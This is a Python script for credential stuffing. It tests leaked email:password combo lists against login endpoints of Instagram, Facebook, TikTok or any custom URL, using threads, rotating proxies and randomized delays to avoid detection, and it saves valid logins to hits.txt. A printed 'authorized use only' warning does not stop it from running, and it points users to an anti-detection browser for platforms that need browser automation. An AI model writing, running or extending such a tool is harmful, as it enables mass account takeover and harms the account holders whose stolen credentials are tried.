#!/usr/bin/env python3
"""
account_checker.py - Bulk account credential checker (combo list tester).
Tests username:password combos against a target platform login endpoint.

Usage:
    python scripts/account_checker.py --target tiktok --combo combo.txt --proxy-file proxies.txt
    python scripts/account_checker.py --target custom --login-url URL --combo combo.txt
    python scripts/account_checker.py --target facebook --combo combo.txt --threads 5 --delay 2

combo.txt format: email:password or user:pass (one per line)
"""
import argparse
import concurrent.futures
import json
import os
import random
import sys
import time
import urllib.request as ureq
import urllib.parse as uparse
import urllib.error

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

PLATFORM_CONFIGS = {
    "tiktok": {
        "login_url": "https://www.tiktok.com/login/",
        "method": "browser",  # requires browser automation
        "success_indicator": "sid_guard",
        "fail_indicator": "Login failed",
    },
    "facebook": {
        "login_url": "https://www.facebook.com/login/",
        "method": "browser",
        "success_indicator": "c_user",
        "fail_indicator": "incorrect",
    },
    "instagram": {
        "login_url": "https://www.instagram.com/api/v1/accounts/login/",
        "method": "api",
        "success_indicator": "logged_in_user",
        "fail_indicator": "error",
    },
}


def check_credential(login_url: str, email: str, password: str,
                     proxy: str = None, timeout: int = 15,
                     success_kw: str = "dashboard",
                     fail_kw: str = "invalid") -> dict:
    """Generic HTTP form-based credential check."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    }
    data = uparse.urlencode({"email": email, "pass": password, "username": email, "password": password}).encode()

    handlers = [ureq.HTTPCookieProcessor()]
    if proxy:
        handlers.append(ureq.ProxyHandler({"http": proxy, "https": proxy}))
    opener = ureq.build_opener(*handlers)
    for k, v in headers.items():
        opener.addheaders = [(k, v)]

    start = time.time()
    try:
        resp = opener.open(login_url, data, timeout=timeout)
        content = resp.read().decode("utf-8", errors="replace")
        cookies = {c.name: c.value for c in opener.handlers[0].cookiejar}
        elapsed = round((time.time() - start) * 1000)

        if success_kw.lower() in content.lower() or any(success_kw in c for c in cookies):
            return {"status": "HIT", "email": email, "password": password,
                    "cookies": cookies, "elapsed_ms": elapsed}
        elif fail_kw.lower() in content.lower():
            return {"status": "FAIL", "email": email, "elapsed_ms": elapsed}
        else:
            return {"status": "UNKNOWN", "email": email, "elapsed_ms": elapsed,
                    "hint": content[:100]}
    except Exception as e:
        return {"status": "ERROR", "email": email, "error": str(e)[:80]}


def check_bulk(combos: list, login_url: str, success_kw: str, fail_kw: str,
               proxies: list = None, threads: int = 5, delay: float = 1.0) -> list:
    hits = []
    lock = __import__("threading").Lock()

    def worker(combo: str):
        if ":" not in combo:
            return
        email, password = combo.split(":", 1)
        proxy = random.choice(proxies) if proxies else None
        result = check_credential(login_url, email.strip(), password.strip(),
                                  proxy, success_kw=success_kw, fail_kw=fail_kw)
        with lock:
            status = result["status"]
            print(f"  [{status}] {email[:30]}:{password[:15]} ({result.get('elapsed_ms','?')}ms)")
            if status == "HIT":
                hits.append(result)
                # Save hit immediately
                with open("hits.txt", "a") as f:
                    f.write(f"{email}:{password}\n")
        time.sleep(delay + random.uniform(0, delay * 0.5))

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(worker, combos)

    return hits


def main():
    if not ENGAGEMENT_PROOF:
        print("[!] WARNING: Set ENGAGEMENT_PROOF env var. Only use on authorized accounts.")
        print("    This tool is for account recovery and authorized security testing ONLY.")

    p = argparse.ArgumentParser(description="Account checker (authorized use only)")
    p.add_argument("--target", choices=list(PLATFORM_CONFIGS.keys()) + ["custom"], default="custom")
    p.add_argument("--login-url", help="Custom login URL")
    p.add_argument("--combo", required=True, help="Combo list file (email:pass)")
    p.add_argument("--proxy-file", help="Proxy list file")
    p.add_argument("--threads", type=int, default=3)
    p.add_argument("--delay", type=float, default=2.0, help="Delay between requests (seconds)")
    p.add_argument("--success-kw", default="dashboard", help="Success keyword in response")
    p.add_argument("--fail-kw", default="invalid", help="Failure keyword in response")
    args = p.parse_args()

    with open(args.combo) as f:
        combos = [l.strip() for l in f if ":" in l.strip()]
    print(f"[*] Loaded {len(combos)} combos")

    proxies = None
    if args.proxy_file:
        with open(args.proxy_file) as f:
            proxies = [l.strip() for l in f if l.strip()]
        print(f"[*] Loaded {len(proxies)} proxies")

    if args.target in PLATFORM_CONFIGS and PLATFORM_CONFIGS[args.target]["method"] == "browser":
        print(f"[!] {args.target} requires browser automation. Use mmo-anti-detection-browser skill.")
        print(f"    Configure: anti-detect browser + this checker + playwright automation")
        sys.exit(0)

    login_url = args.login_url or PLATFORM_CONFIGS.get(args.target, {}).get("login_url", "")
    if not login_url:
        print("[-] --login-url required for custom target"); sys.exit(1)

    hits = check_bulk(combos, login_url, args.success_kw, args.fail_kw, proxies, args.threads, args.delay)
    print(f"\n[*] Results: {len(hits)}/{len(combos)} hits")
    if hits:
        print("[+] Hits saved to hits.txt")


if __name__ == "__main__":
    main()
